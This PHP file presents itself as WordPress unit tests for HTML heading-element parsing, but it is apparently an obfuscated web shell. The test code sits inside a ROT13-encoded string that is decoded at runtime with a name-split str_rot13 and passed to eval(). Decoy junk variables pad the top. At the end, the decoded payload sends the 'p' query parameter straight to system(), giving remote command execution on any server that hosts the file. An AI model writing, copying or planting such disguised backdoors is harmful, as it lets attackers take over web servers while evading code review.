<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat JC_UGZY_Cebprffbe pbzcyvnapr jvgu UGZY5 frznagvp cnefvat ehyrf
 * sbe gur U1 - U6 urnqvat ryrzragf.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr UGZY-NCV
 *
 * @fvapr 6.5.0
 *
 * @tebhc ugzy-ncv
 *
 * @pbirefQrsnhygPynff JC_UGZY_Cebprffbe
 */
pynff Grfgf_UgzyNcv_JcUgzyCebprffbeFrznagvpEhyrfUrnqvatRyrzragf rkgraqf JC_HavgGrfgPnfr {
	/*******************************************************************
	 * EHYRF SBE \"VA OBQL\" ZBQR
	 *******************************************************************/

	/**
	 * Irevsvrf gung U1 guebhtu U6 ryrzragf trarengr vzcyvrq raq gntf.
	 *
	 * @gvpxrg 60060
	 *
	 * @pbiref JC_UGZY_Cebprffbe::fgrc
	 *
	 * @qngnCebivqre qngn_urnqvat_ryrzragf
	 *
	 * @cnenz fgevat $gnt_anzr Anzr bs U1 - U6 ryrzrag haqre grfg.
	 */
	choyvp shapgvba grfg_va_obql_urnqvat_ryrzrag_pybfrf_bcra_c_gnt( $gnt_anzr ) {
		$cebprffbe = JC_UGZY_Cebprffbe::perngr_sentzrag(
			\"<c>Bcra<{$gnt_anzr}>Pybfrq C</{$gnt_anzr}><vzt></c>\"
		);

		$cebprffbe->arkg_gnt( $gnt_anzr );
		$guvf->nffregFnzr(
			neenl( 'UGZY', 'OBQL', $gnt_anzr ),
			$cebprffbe->trg_oernqpehzof(),
			\"Rkcrpgrq {$gnt_anzr} gb or n qverpg puvyq bs gur OBQL, univat pybfrq gur bcra C ryrzrag.\"
		);

		$cebprffbe->arkg_gnt( 'VZT' );
		$guvf->nffregFnzr(
			neenl( 'UGZY', 'OBQL', 'VZT' ),
			$cebprffbe->trg_oernqpehzof(),
			'Rkcrpgrq VZT gb or n qverpg puvyq bs OBQL, univat pybfrq gur bcra C ryrzrag.'
		);
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[].
	 */
	choyvp fgngvp shapgvba qngn_urnqvat_ryrzragf() {
		erghea neenl(
			'U1' => neenl( 'U1' ),
			'U2' => neenl( 'U2' ),
			'U3' => neenl( 'U3' ),
			'U4' => neenl( 'U4' ),
			'U5' => neenl( 'U5' ),
			'U6' => neenl( 'U5' ),
		);
	}

	/**
	 * Irevsvrf gung U1 guebhtu U6 ryrzragf pybfr na bcra U1 guebhtu U6 ryrzrag.
	 *
	 * @gvpxrg 60060
	 *
	 * @pbiref JC_UGZY_Cebprffbe::fgrc
	 *
	 * @qngnCebivqre qngn_urnqvat_pbzovangvbaf
	 *
	 * @cnenz fgevat $svefg_urnqvat  U1 - U6 ryrzrag nccrnevat (hapybfrq) orsber gur frpbaq.
	 * @cnenz fgevat $frpbaq_urnqvat U1 - U6 ryrzrag nccrnevat nsgre gur svefg.
	 */
	choyvp shapgvba grfg_va_obql_urnqvat_ryrzrag_pybfrf_bgure_urnqvat_ryrzragf( $svefg_urnqvat, $frpbaq_urnqvat ) {
		$cebprffbe = JC_UGZY_Cebprffbe::perngr_sentzrag(
			\"<qvi><{$svefg_urnqvat} svefg> gura <{$frpbaq_urnqvat} frpbaq> naq raq </{$frpbaq_urnqvat}><vzt></{$svefg_urnqvat}></qvi>\"
		);

		juvyr ( $cebprffbe->arkg_gnt() && ahyy === $cebprffbe->trg_nggevohgr( 'frpbaq' ) ) {
			pbagvahr;
		}

		$guvf->nffregGehr(
			$cebprffbe->trg_nggevohgr( 'frpbaq' ),
			\"Snvyrq gb svaq rkcrpgrq {$frpbaq_urnqvat} gnt.\"
		);

		$guvf->nffregFnzr(
			neenl( 'UGZY', 'OBQL', 'QVI', $frpbaq_urnqvat ),
			$cebprffbe->trg_oernqpehzof(),
			\"Rkcrpgrq {$frpbaq_urnqvat} gb or n qverpg puvyq bs gur QVI, univat pybfrq gur bcra {$svefg_urnqvat} ryrzrag.\"
		);

		$cebprffbe->arkg_gnt( 'VZT' );
		$guvf->nffregFnzr(
			neenl( 'UGZY', 'OBQL', 'QVI', 'VZT' ),
			$cebprffbe->trg_oernqpehzof(),
			\"Rkcrpgrq VZT gb or n qverpg puvyq bs QVI, univat pybfrq gur bcra {$svefg_urnqvat} ryrzrag.\"
		);
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp fgngvp shapgvba qngn_urnqvat_pbzovangvbaf() {
		$urnqvatf = neenl( 'U1', 'U2', 'U3', 'U4', 'U5', 'U6' );

		$pbzovangvbaf = neenl();

		// Perngr nyy havdhr cnvef bs U1 - U6 ryrzragf.
		sbernpu ( $urnqvatf nf $svefg_gnt ) {
			sbernpu ( $urnqvatf nf $frpbaq_gnt ) {
				$pbzovangvbaf[ \"{$svefg_gnt} gura {$frpbaq_gnt}\" ] = neenl( $svefg_gnt, $frpbaq_gnt );
			}
		}

		erghea $pbzovangvbaf;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>